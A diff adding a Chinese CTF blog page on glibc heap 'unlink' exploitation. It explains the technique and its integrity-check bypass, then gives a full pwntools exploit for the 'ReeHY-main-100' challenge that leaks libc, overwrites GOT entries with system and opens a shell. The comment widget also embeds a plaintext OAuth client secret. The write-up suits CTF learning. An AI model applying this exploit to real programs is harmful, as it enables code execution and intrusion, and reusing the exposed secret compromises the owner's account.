@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    unlink exp |
+    
+    summerN&#39;s blog</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<script src="/js/pace.min.js"></script>
+
+<meta name="generator" content="Hexo 4.1.1"><link rel="alternate" href="/atom.xml" title="summerN's blog" type="application/atom+xml">
+</head>
+
+<body>
+<main class="content">
+  <section class="outer">
+  
+
+<article id="post-unlink exp" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+  
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      unlink exp
+    </h1>
+  
+  
+
+
+
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2020/03/28/unlink%20exp/" class="article-date">
+  <time datetime="2020-03-28T10:05:20.830Z" itemprop="datePublished">2020-03-28</time>
+</a>
+        
+      </div>
+    
+
+    
+      
+    <div class="tocbot"></div>
+
+
+
+
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+        <h1 id="Unlink-exp"><a href="#Unlink-exp" class="headerlink" title="Unlink exp"></a>Unlink exp</h1><a id="more"></a>
+
+<h2 id="基础知识："><a href="#基础知识：" class="headerlink" title="基础知识："></a>基础知识：</h2><h3 id="1-一个-heap-chunk-是如下的结构"><a href="#1-一个-heap-chunk-是如下的结构" class="headerlink" title="1.一个 heap chunk 是如下的结构"></a>1.一个 heap chunk 是如下的结构</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#!c</span><br><span class="line">+-----------+---------+------+------+-------------+</span><br><span class="line">|           |         |      |      |             |</span><br><span class="line">|           |         |      |      |             |</span><br><span class="line">| prev_size |size&amp;Flag|  fd  |  bk  |             |</span><br><span class="line">|           |         |      |      |             |</span><br><span class="line">|           |         |      |      |             |</span><br><span class="line">+-----------+---------+------+------+-------------+</span><br></pre></td></tr></table></figure>
+
+<p><strong>prev_size</strong>,  如果该 chunk 的<strong>物理相邻的前一地址chunk（两个指针的地址差值为前一chunk大小）</strong>是空闲的话，那该字段记录的是前一个 chunk 的大小(包括 chunk 头)。否则，该字段可以用来存储物理相邻的前一个chunk 的数据。<strong>这里的前一 chunk 指的是较低地址的 chunk</strong> 。</p>
+<p>如果本 chunk 前面的 chunk 是空闲的，那么第一部分 prev_size 会记录前面一个 chunk  的大小，第二部分是本 chunk 的 size ,因为它的大小需要8字节对齐，所以 size 的低三位一定会空闲出来，这时候这三个位置就用作三个 Flag (最低位:指示前一个 chunk 是否正在使用;倒数第二位:指示这个 chunk 是否是通过 mmap 方式产生的;倒数第三位:这个 chunk 是否属于一个线程的 arena )。之后的FD和BK部分在此 chunk 是空闲状态时会发挥作用。FD指向下一个空闲的 chunk（调试时是下一个，实际上是之前比此chunk先申请的chunk） ，BK指向前一个空闲的 chunk ，由此串联成为一个空闲 chunk 的双向链表。如果不是空闲的。那么从fd开始，就是用户数据了。</p>
+<h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><p>向后合并是想低地址合并，向前合并是向高地址合并</p>
+<h3 id="1-检查是否可以向后合并"><a href="#1-检查是否可以向后合并" class="headerlink" title="1).检查是否可以向后合并"></a>1).检查是否可以向后合并</h3><p>首先需要检查 previous chunk 是否是空闲的（通过当前 chunk size 部分中的 flag 最低位去判断），当然在这个例子中，因为在默认情况下，堆内存中的第一个chunk总是被设置为allocated的，即使它根本就不存在。</p>
+<p>如果为free的话，那么就进行向后合并：</p>
+<p>1)将前一个chunk占用的内存合并到当前chunk;</p>
+<p>2)修改指向当前chunk的指针，改为指向前一个chunk。</p>
+<p>3)使用unlink宏，将前一个free chunk从双向循环链表中移除。</p>
+<p>前一个 chunk 是正在使用的，不满足向后合并的条件。</p>
+<h3 id="2-检查是否可以向前合并"><a href="#2-检查是否可以向前合并" class="headerlink" title="2).检查是否可以向前合并"></a>2).检查是否可以向前合并</h3><p>在这里需要检查 next chunk 是否是空闲的(通过下下个 chunk 的flag的最低位去判断)，在找下下个chunk(这里的下、包括下下都是相对于  chunk first 而言的)的过程中，首先当前 chunk+ 当前 size 可以引导到下个 chunk ，然后从下个 chunk  的开头加上下个 chunk 的 size 就可以引导到下下个 chunk 。但是我们已经把下个 chunk 的 size  覆盖为了-4，那么它会认为下个 chunk 从 prev_size 开始就是下下个chunk了，既然已经找到了下下个 chunk  ，那就就要去看看 size 的最低位以确定下个 chunk 是否在使用，当然这个 size 是 -4 ，所以它指示下个 chunk 是空闲的。</p>
+<p>在这个时候，就要发生向前合并了。即 first chunk 会和 first chunk 的下个 chunk (即 second  chunk )发生合并。在此时会触发 unlink(second) 宏，想将 second 从它所在的 bin list 中解引用。</p>
+<p>具体如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BK&#x3D;second-&gt;bk（在例子中bk实际上是shellcode的地址）</span><br><span class="line">FD&#x3D;second-&gt;fd (在例子中fd实际上是free@got的地址 - 12)</span><br><span class="line">FD-&gt;bk&#x3D;BK</span><br><span class="line">&#x2F;*shellcode的地址被写进了FD+12的位置，但是FD是free@got的地址-12，所以实际上我们已经把shellcode地址写入了free@got*&#x2F;</span><br><span class="line">BK-&gt;fd&#x3D;FD</span><br></pre></td></tr></table></figure>
+
+<p>执行 unlink 宏之后，再调用 free 其实就是调用 shellcode ，这时就可以执行任意命令了。</p>
+<h3 id="3-跳过保护"><a href="#3-跳过保护" class="headerlink" title="3.跳过保护"></a>3.跳过保护</h3><p>在新的glibc中给我造成最阻碍的是双链表冲突检测，该机制会在执行unlink操作的时候检测链表中前一个chunk的fd与后一个chunk的bk是否都指向当前需要unlink的chunk。这样攻击者就无法替换second chunk的fd与fd了。相关代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (__builtin_expect (FD-&gt;bk !&#x3D; P || BK-&gt;fd !&#x3D; P, 0))             \</span><br><span class="line">      malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P);      \</span><br></pre></td></tr></table></figure>
+
+<p>这段代码被添加到了 unlink 宏中，所以现在再调用 unlink 宏的时候， chunk 指针 P-&gt;fd-&gt;bk (即代码中的大写 FD-&gt;bk )应该还是p指针自己。对于 BK-&gt;fd != p 这部分也是同样的道理。</p>
+<p>我们在此记 FD=p-&gt;fd , BK=p-&gt;bk ,再去看 FD-&gt;bk 已经是 free@got 了，BK-&gt;fd也是同样的道理,所以如上文的利用方法已经不能成功了。之所以介绍上一个方法就是为了更好的理解掌握绕过这个检测机制。</p>
+<p>想要绕过这里我们需要找一个指向 p 的的已知的地址，然后根据这个地址去设置伪造的fd和bk指针就能改掉原 p 指针。</p>
+<p>以64bit为例,假设找到了一个已知地址的ptr是指向p(p指向堆上的某个地方)的，通过堆溢出，我们可以做如下的修改。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p-&gt;fd&#x3D;ptr-0x18</span><br><span class="line">p-&gt;bk&#x3D;ptr-0x10</span><br></pre></td></tr></table></figure>
+
+<p>布置好如此结构后，再触发unlink宏，会发生如下情况。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.FD&#x3D;p-&gt;fd(实际是ptr-0x18)</span><br><span class="line">2.BK&#x3D;p-&gt;bk(实际是ptr-0x10)</span><br><span class="line">3.检查是否满足上文所示的限制，由于FD-&gt;bk和BK-&gt;fd均为*ptr(即p)，由此可以过掉这个限制</span><br><span class="line">4.FD-&gt;bk&#x3D;BK</span><br><span class="line">5.BK-&gt;fd&#x3D;FD(p&#x3D;ptr-0x18)</span><br></pre></td></tr></table></figure>
+
+<p>这时候再对p进行写入，可以覆盖掉p原来的值，例如我们用合适的 payload 将 free@got  写入。p就变成了 free@got ，那么再改一次p，把 free@got 改为 shellcode 的地址或者说 system  的地址都可以。之后再调用free功能，就可以任意命令执行。</p>
+<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>一般使用的事chunk0伪造为释放状态，溢出修改chunk1的prev_size 以及chunk1_size的flag位，这样的话会少溢出很多，即向后合并</p>
+<h2 id="例题：攻防世界-4-ReeHY-main-100"><a href="#例题：攻防世界-4-ReeHY-main-100" class="headerlink" title="例题：攻防世界 4-ReeHY-main-100"></a>例题：攻防世界 4-ReeHY-main-100</h2><p>1.数组下限没有规定，可以通过修改数组的下标来修改edit的长度，从而实现溢出</p>
+<p>2.unlink将我们指定的任意位置str存放str-0x18（64位）地址</p>
+<p>3.通过unlink可以实现堆got表的挟持，从而通过puts泄露libc_base</p>
+<p>4.得到基地址后可以通过挟持got等方法进行getshell</p>
+<p>5.注意细节</p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='summerN@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.arch = 'amd64'</span></span><br><span class="line"><span class="comment">#context.arch = 'i386'</span></span><br><span class="line">context.os = <span class="string">'linux'</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">file_name = <span class="string">'./1'</span></span><br><span class="line">libc_name = <span class="string">'./ctflibc.so.6'</span></span><br><span class="line">ip = <span class="string">'111.198.29.45'</span></span><br><span class="line">port = <span class="string">'30813'</span></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span>(debug == <span class="number">1</span>):</span><br><span class="line">	p = process(file_name)</span><br><span class="line">	elf = ELF(file_name)</span><br><span class="line">	libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(ip,int(port))</span><br><span class="line">	elf = ELF(file_name)</span><br><span class="line">	<span class="comment">#libc = ELF("../libc/18-libc64.so")</span></span><br><span class="line">li = <span class="keyword">lambda</span> name,x : log.info(name+<span class="string">':0x%x'</span>%x)</span><br><span class="line">ls = <span class="keyword">lambda</span> name,x : log.success(name+<span class="string">':0x%x'</span>%x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,index,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'$ '</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Input size\n'</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">'Input cun\n'</span>)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line">	p.sendafter(<span class="string">'Input content\n'</span>,content) </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'$ '</span>)</span><br><span class="line">	p.sendline(<span class="string">'2'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Chose one to dele\n'</span>)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'$ '</span>)</span><br><span class="line">	p.sendline(<span class="string">'3'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Chose one to edit\n'</span>)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line">	p.recvuntil(<span class="string">'Input the content\n'</span>)</span><br><span class="line">	p.send(str(content))</span><br><span class="line">size_add = <span class="number">0x6020c0</span></span><br><span class="line">chunk_add = <span class="number">0x6020e0</span></span><br><span class="line">flag_add = <span class="number">0x6020e8</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"$ "</span>,<span class="string">"summerN"</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="number">0</span>,<span class="string">'\x00'</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="number">1</span>,<span class="string">'\x00'</span>)</span><br><span class="line">free(<span class="number">-2</span>)</span><br><span class="line">payload = p32(<span class="number">0x200</span>) + p32(<span class="number">0x200</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="number">2</span>,payload)</span><br><span class="line"><span class="comment">#触发unlink</span></span><br><span class="line">payload1 = p64(<span class="number">0</span>) + p64(<span class="number">0x100</span>+<span class="number">1</span>)</span><br><span class="line">payload1 += p64(chunk_add - <span class="number">0x18</span>)  + p64(chunk_add - <span class="number">0x10</span>)</span><br><span class="line">payload1 += <span class="string">'\x00'</span> * (<span class="number">0x100</span> - <span class="number">32</span>)</span><br><span class="line">payload1 += p64(<span class="number">0x100</span>) + p64(<span class="number">0x110</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload1)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#unlink-------结束</span></span><br><span class="line"><span class="comment">#leak libc</span></span><br><span class="line">free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line">free_plt = elf.plt[<span class="string">'free'</span>]</span><br><span class="line">puts_plt = p64(<span class="number">0x4006d0</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">atoi_got = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line">payload3 = <span class="string">'\x00'</span> * <span class="number">0x18</span> + p64(<span class="number">0x6020c8</span>) + p64(<span class="number">1</span>) + p64(free_got) + p64(<span class="number">1</span>) +p64(puts_got) + p64(<span class="number">1</span>) + p64(atoi_got) + p64(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload3)</span><br><span class="line">edit(<span class="number">1</span>,puts_plt)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">puts_true = u64(p.recv(<span class="number">6</span>).strip(<span class="string">'\n'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>,int(puts_true))</span><br><span class="line">libc_base = puts_true - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">sys_add = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">bin_add = libc_base + libc.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,p64(sys_add))</span><br><span class="line"><span class="comment">#edit(3,p64(bin_add))</span></span><br><span class="line">p.recvuntil(<span class="string">'$ '</span>)</span><br><span class="line">p.sendline(<span class="string">'/bin/sh'</span>)<span class="comment">#我们没法用bin_add 因为我们没法让sys函数去执行这个地址里面的数据</span></span><br><span class="line"><span class="comment">#但是如果使用payload3的方法将bin_add写入的话可以，不写入的话，可以挟持atio_got</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><a href="http://yunnigu.dropsec.xyz/2017/04/05/%E5%A0%86%E6%BA%A2%E5%87%BA%E4%B9%8Bunlink%E7%9A%84%E5%88%A9%E7%94%A8/" target="_blank" rel="noopener">参考</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://summern.club/2020/03/28/unlink%20exp/" data-id="ck8bgc4mm000ktwlueeyp8e0l"
+         class="article-share-link">Share</a>
+      
+    </footer>
+
+  </div>
+
+  
+    
+  <nav class="article-nav">
+    
+    
+      <a href="/2020/03/11/2020%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%ABpwn/" class="article-nav-link">
+        <strong class="article-nav-caption">Olde posts</strong>
+        <div class="article-nav-title">2020高校战疫pwn</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+  
+    
+  <div class="gitalk" id="gitalk-container"></div>
+  
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+
+  
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+  
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+
+  <script type="text/javascript">
+    var gitalk = new Gitalk({
+      clientID: '665e1db541e975225bc6',
+      clientSecret: '525f3534fe6005375cf8c02330ed09a2b7aab7d5',
+      repo: 'talk',
+      owner: 'summerN',
+      admin: ['summerN'],
+      // id: location.pathname,      // Ensure uniqueness and length less than 50
+      id: md5(location.pathname),
+      distractionFreeMode: false,  // Facebook-like distraction free mode
+      pagerDirection: 'last'
+    })
+
+  gitalk.render('gitalk-container')
+  </script>
+
+  
+
+</article>
+
+
+
+</section>
+  <footer class="footer">
+  <div class="outer">
+    <div class="float-right">
+      <ul class="list-inline">
+  
+    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
+  
+</ul>
+    </div>
+    <ul class="list-inline">
+      <li>&copy; 2020 summerN&#39;s blog</li>
+      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
+      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean" target="_blank" rel="noopener">Ocean</a></li>
+    </ul>
+  </div>
+</footer>
+
+</main>
+
+<aside class="sidebar sidebar-specter">
+  
+    <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+    <div class="logo">
+      <a href="/"><img src="/images/hexo.svg" alt="summerN&#39;s blog"></a>
+    </div>
+  
+  <ul class="nav nav-main">
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/">Home</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/archives">Archives</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/gallery">Gallery</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/about">About</a>
+      </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="Search">
+        <i class="fe fe-search"></i>
+        Search
+      </a>
+    </li>
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      <div class="totop" id="totop">
+  <i class="fe fe-rocket"></i>
+</div>
+    </li>
+    <li class="nav-item">
+      
+        <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+          <i class="fe fe-feed"></i>
+        </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+  </aside>
+  
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+  
+<script src="/js/tocbot.min.js"></script>
+
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+
+<script src="/js/ocean.js"></script>
+
+
+</body>
+</html>
